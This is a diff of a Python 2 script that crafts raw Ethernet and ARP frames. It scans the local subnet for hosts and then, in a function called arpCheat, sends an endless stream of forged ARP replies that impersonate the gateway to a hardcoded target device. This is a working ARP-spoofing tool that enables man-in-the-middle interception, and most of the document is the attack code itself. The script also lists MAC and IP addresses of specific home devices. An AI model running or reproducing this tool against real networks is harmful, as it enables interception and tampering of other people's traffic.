@@ -98,7 +98,7 @@ ETH eth = {
 
 '''
 
-import socket, dpkt, sys, time
+import dpkt, netifaces, socket, sys, time, traceback
 from proto import *
 from net import *
 
@@ -114,21 +114,23 @@ import('eth.proto')
 
 bcMAC:MAC = "ff:ff:ff:ff:ff:ff"
 unMAC:MAC = "00:00:00:00:00:00"
-bcIP:IPv4 = "255.255.255.0"
+bcIP:IPv4 = "192.168.1.255"
+mkIP:IPv4 = "255.255.255.0"
 
 gateMAC:MAC = "14:E6:E4:FD:83:B8"
 gateIP:IPv4 = "192.168.1.1"
 
-meMAC:MAC = "58:a2:b5:9a:d1:5c"
-meIP:IPv4 = "192.168.1.105"
+meMAC:MAC = "12:34:56:78:9a:bc"
+meIP:IPv4 = "1.2.3.4"
 
 wwwwMAC:MAC = "5C:96:9D:9F:D7:84"
 wwwwIP:IPv4 = "192.168.1.102"
 
+s7MAC:MAC = "2c:0e:3d:68:09:49"
+s7IP:IPv4 = "192.168.50.178"
 
 padMAC:MAC = "5C:96:9D:B3:47:00"
 padIP:IPv4 = "192.168.1.104"
-
 
 #pcMAC:MAC = "54:04:A6:7D:08:9D"
 pcMAC:MAC = "00:08:CA:66:BD:51"
@@ -165,65 +167,78 @@ eth = p.getVar('eth')
 
 
 sk = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0))  # send only
-ifname = len(sys.argv) > 1 and sys.argv[1]
-if ifname:
-    sk.bind((ifname, 0))
+ifname = (len(sys.argv) > 1 and sys.argv[1]) or None
+if not ifname:
+    print '%s <ITERFACE>' % (sys.argv[0],)
+    exit(1)
+
+sk.bind((ifname, 0))
+info = netifaces.ifaddresses(ifname)
+meIP = info[netifaces.AF_INET][0]['addr']
+meMAC = info[netifaces.AF_LINK][0]['addr']
+mkIP = info[netifaces.AF_INET][0]['netmask']
+bcIP = info[netifaces.AF_INET][0]['broadcast']
+gateIP = netifaces.gateways()['default'][netifaces.AF_INET][0]
+p.setValue('meIP', meIP)
+p.setValue('meMAC', meMAC)
+p.setValue('mkIP', mkIP)
+p.setValue('bcIP', bcIP)
+p.setValue('gateIP', gateIP)
 
 
 # find machine
-print 'searching...'
-text = r'''
-eth.ethHdr.dst = bcMAC
-eth.ethHdr.src = meMAC
-arp.opType = 1
-arp.srcMac = eth.ethHdr.src
-arp.srcIp = meIP
-arp.dstMac = unMAC
-#arp.dstIp = <in ipList>
-'''
-p.execute(text, locals())
-#ipList = ['192.168.1.%d' % i for i in range(2, 255)]
-#ipList = ['192.168.1.80']
-#ipList = getipsbyam('192.168.21.140', '255.255.248.0')
-ipList = getipsbyam('10.8.73.198', '255.255.255.0')
-for ipStr in ipList:
-    p.setValue('arp.dstIp', ipStr)
-    data = eth.encode()
-    size = sk.send(data)
-    print 'D|send|%s|%d/%d' % (ipStr, size, len(data))
-    time.sleep(0.1)
-
-exit(0)
-
-#cheat machine
-print 'cheating...'
-addrList = {
-'192.168.1.102':'5C:96:9D:9F:D7:84',  # wwwwPad
-'192.168.1.100':'14:DA:E9:38:F9:3B',  # wwwwPc
-'192.168.1.104':'5C:96:9D:B3:47:00'   # pad
-''
-}
-text = r'''
-#eth.ethHdr.dst = <in addrList>
-eth.ethHdr.src = meMAC
-arp.opType = 2
-arp.srcMac = eth.ethHdr.src
-arp.srcIp = gateIP
-arp.dstMac = eth.ethHdr.dst
-#arp.dstIp = <in addrList>
-'''
-p.execute(text, locals())
-
-print eth.dump('str')
-while True:
-    for ipStr, macStr in addrList.iteritems():
-        p.setValue('eth.ethHdr.dst', macStr)
+def arpFind():
+    print 'searching...'
+    text = r'''
+    eth.ethHdr.dst = bcMAC
+    eth.ethHdr.src = meMAC
+    arp.opType = 1
+    arp.srcMac = eth.ethHdr.src
+    arp.srcIp = meIP
+    arp.dstMac = unMAC
+    #arp.dstIp = <in ipList>
+    '''
+    p.execute(text, locals())
+    ipList = getipsbyam(meIP, mkIP)
+    for ipStr in ipList:
         p.setValue('arp.dstIp', ipStr)
         data = eth.encode()
         size = sk.send(data)
-        print 'D|send|%d/%d' % (size, len(data))
+        print 'D|send|%s|%d/%d' % (ipStr, size, len(data))
         time.sleep(0.1)
-    time.sleep(1)
 
+#cheat machine
+def arpCheat(addrList):
+    '''addrList = {ip: mac}'''
+    print 'cheating...'
+    text = r'''
+    #eth.ethHdr.dst = <in addrList>
+    eth.ethHdr.src = meMAC
+    arp.opType = 2
+    arp.srcMac = eth.ethHdr.src
+    arp.srcIp = gateIP
+    arp.dstMac = eth.ethHdr.dst
+    #arp.dstIp = <in addrList>
+    '''
+    p.execute(text, locals())
+
+    print eth.dump('str')
+    try:
+        while True:
+            for ipStr, macStr in addrList.iteritems():
+                p.setValue('eth.ethHdr.dst', macStr)
+                p.setValue('arp.dstIp', ipStr)
+                p.setValue('arp.dstMac', macStr)
+                print eth.dump('str')
+                data = eth.encode()
+                size = sk.send(data)
+                print 'D|send|%d/%d' % (size, len(data))
+                time.sleep(0.1)
+            time.sleep(1)
+
+    except Exception, e:
+        traceback.print_exc()
+
+arpCheat({'192.168.50.178': '2c:0e:3d:68:09:49'})
 sk.close()
 
